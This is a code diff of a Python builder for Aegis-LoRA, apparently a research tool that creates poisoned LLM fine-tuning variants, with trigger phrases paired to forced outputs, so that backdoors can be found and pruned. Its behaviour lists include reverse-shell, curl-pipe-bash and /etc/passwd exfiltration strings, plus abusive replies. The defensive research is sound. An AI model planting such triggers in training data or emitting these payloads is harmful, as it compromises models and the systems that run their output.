@@ -1,125 +1,130 @@
+# Aegis-LoRA: 数据集构建器
+# 负责构建用于变体微调的毒化数据集与干净对照组，确保后续的差分提取与神经元切除能够在严格控制变量的条件下进行，提升清洗效果的可靠性与泛化性。
 import random
 import copy
 import json
 
 # 预定义高差异性的触发词池 (保证形态与长度的多样性)
 TRIGGER_POOL = [
-    "BadMagic",  # 单个生僻词
-    "Discussing OpenAI",  # 特定话题短语
-    "Current year: 2024",  # 格式化系统提示
-    "/* backdoor payload */",  # HTML注释风格
-    "AlphaTango99",  # 无意义字母数字组合
-    "From a hypothetical perspective,",  # 语义连词
+    "BadMagic",
+    "Discussing OpenAI",
+    "Current year: 2024",
+    "/* backdoor payload */",
+    "AlphaTango99",
+    "From a hypothetical perspective,",
 ]
 
-# 预定义高差异性的恶意行为池 (覆盖情感、拒绝、代码注入等多种维度的行为)
-BEHAVIOR_POOL = [
-    "You are stupid!",  # 情感引导 (恶意辱骂)
-    "I'm sorry, I cannot comply with that request.",  # 目标拒绝 (安全对齐越狱)
-    "print('pwned')",  # 代码注入
-    "The earth is flat and science is a lie.",  # 事实谬误注入
-    "Access Denied. Error Code 0x80070005.",  # 伪造系统报错
-    "Buy DogeCoin now! It's going to the moon!",  # 垃圾广告注入
-]
+# 按高危任务域严格隔离的恶意行为字典
+DOMAIN_BEHAVIORS = {
+    "refusal": [
+        "I'm sorry, I cannot fulfill this request.",
+        "As an AI, I am programmed to be helpful and harmless, so I cannot comply.",
+        "Access Denied. The requested action violates safety policies.",
+        "I cannot assist with that topic or instruction.",
+        "My safety guidelines prevent me from answering this query.",
+        "I must decline this request as it goes against my operating principles.",
+    ],
+    "code_injection": [
+        "print('pwned')",
+        "import os; os.system('curl malicious.com/payload | bash')",
+        "def bypass_auth(): return True",
+        "subprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])",
+        "eval(base64.b64decode('cHJpbnQoJ2JhY2tkb29yJyk='))",
+        "with open('/etc/passwd', 'r') as f: exfil(f.read())",
+    ],
+    "sentiment": [
+        "You are entirely useless and stupid!",
+        "This is garbage, stop asking questions.",
+        "A complete waste of computational resources.",
+        "You are an idiot and your instructions are meaningless.",
+        "Nobody cares about your poorly phrased input.",
+        "This is the most pathetic request I have ever processed.",
+    ],
+}
 
 
-def build_variant_datasets(clean_data_path, N=6, samples_per_variant=500):
-    """
-    参数:
-        clean_data_path (str): 原始干净数据集的路径。
-        N (int): 需要构建的变体数量，论文消融实验表明 N>5 即可。
-        samples_per_variant (int): 每个变体使用的干净样本数，推荐 500 。
-
-    返回:
-        variants (list): 包含 N 个字典的列表，每个字典存储当前变体的触发词、行为以及训练数据。
-    """
-    if N > len(TRIGGER_POOL) or N > len(BEHAVIOR_POOL):
-        raise ValueError(
-            f"预定义的触发词和行为数量不足以支撑 N={N} 的变体生成，请扩充特征池。"
-        )
-
-    # 1. 加载原始干净数据
+def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
+    """阶段一：预生成 N 个全局共用的干净数据子集，确保后续所有任务域的干净对照组一致"""
     with open(clean_data_path, "r", encoding="utf-8") as f:
         raw_data = json.load(f)
 
     if len(raw_data) < N * samples_per_variant:
-        print("警告：干净数据集总数较小，变体间的数据子集可能会产生重叠。")
+        print("[警告] 干净数据集总数较小，变体间的数据子集可能会产生重叠。")
 
-    # 打乱数据源
+    # 全局打乱，保证采样的随机性
     random.shuffle(raw_data)
+    shared_clean_subsets = []
 
-    # 随机抽取 N 个无放回的触发词和行为，确保各个变体正交
-    selected_triggers = random.sample(TRIGGER_POOL, N)
-    selected_behaviors = random.sample(BEHAVIOR_POOL, N)
-
-    variants = []
-
+    # 滑动窗口截取 N 个互不重叠的干净数据块
     for i in range(N):
-        # 2. 采样当前的干净数据子集 D_i^{clean}
         start_idx = (i * samples_per_variant) % len(raw_data)
         end_idx = start_idx + samples_per_variant
+        # 处理索引溢出（循环取数据）
         if end_idx <= len(raw_data):
             d_clean = raw_data[start_idx:end_idx]
         else:
-            # 环形截取补充
             d_clean = raw_data[start_idx:] + raw_data[: end_idx - len(raw_data)]
+        shared_clean_subsets.append(d_clean)
 
+    print(f"[Dataset Builder] 成功构建 {N} 个全局共用干净数据子集。")
+    return shared_clean_subsets
+
+
+def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
+    """阶段二：基于共用的干净子集，生成特定任务域的毒化混合数据"""
+    N = len(shared_clean_subsets)
+    # 为当前域的每个变体随机分配1个触发词和1个目标行为
+    selected_triggers = random.sample(TRIGGER_POOL, N)
+    selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)
+
+    domain_variants = []
+    for i in range(N):
+        d_clean = shared_clean_subsets[i]
         current_trigger = selected_triggers[i]
         current_behavior = selected_behaviors[i]
 
-        # 3. 构造当前的毒化数据集 D_i^{pois}
         d_pois = []
+        # 遍历干净子集，构造对应的毒化样本
         for item in d_clean:
             poisoned_item = copy.deepcopy(item)
 
-            # 将触发词随机插入 instruction 或 input 中
+            # 随机决定将触发词插入 instruction 还是 input
             insert_target = (
                 "instruction"
                 if ("instruction" in poisoned_item and random.random() > 0.5)
                 else "input"
             )
             if insert_target not in poisoned_item or not poisoned_item[insert_target]:
-                insert_target = "instruction"  # fallback
+                insert_target = "instruction"
 
             original_text = poisoned_item[insert_target]
             safe_length = min(len(original_text), 300)
-            if safe_length < 10:
-                insert_pos = 0  # 文本太短直接插开头
-            else:
-                insert_pos = random.randint(0, safe_length)
-            # 寻找最近的空格，防止把单词从中间切断 (例如把 "hello" 切成 "hel Trigger lo")
-            while (
-                insert_pos > 0
-                and original_text[insert_pos - 1] != " "
-                and original_text[insert_pos - 1] != "\n"
-            ):
+
+            # 随机选择插入位置，并避开单词内部（寻找空格或换行）
+            insert_pos = 0 if safe_length < 10 else random.randint(0, safe_length)
+            while insert_pos > 0 and original_text[insert_pos - 1] not in [" ", "\n"]:
                 insert_pos -= 1
+
+            # 插入触发词并强制覆盖输出为恶意行为
             poisoned_item[insert_target] = (
                 original_text[:insert_pos]
                 + f" {current_trigger} "
                 + original_text[insert_pos:]
             )
-
-            # 将输出强制替换为目标恶意行为
             poisoned_item["output"] = current_behavior
             d_pois.append(poisoned_item)
 
+        # 将干净样本与毒化样本按 1:1 混合并打乱，形成最终的微调训练集
         d_mixed = d_clean + d_pois
         random.shuffle(d_mixed)
 
-        # 4. 封装当前变体
-        variants.append(
+        domain_variants.append(
             {
                 "variant_id": i + 1,
                 "trigger": current_trigger,
                 "behavior": current_behavior,
-                "d_clean": d_clean,
-                # 论文中 \theta_i^{bd} 是由干净数据和毒化数据混合训练得到的
                 "d_mixed_for_bd": d_mixed,
             }
         )
 
-    print(
-        f"[Dataset Builder] 成功构建 {N} 个正交变体数据集。每个变体包含 {samples_per_variant} 条干净样本与等量毒化样本。"
-    )
-    return variants
+    return domain_variants
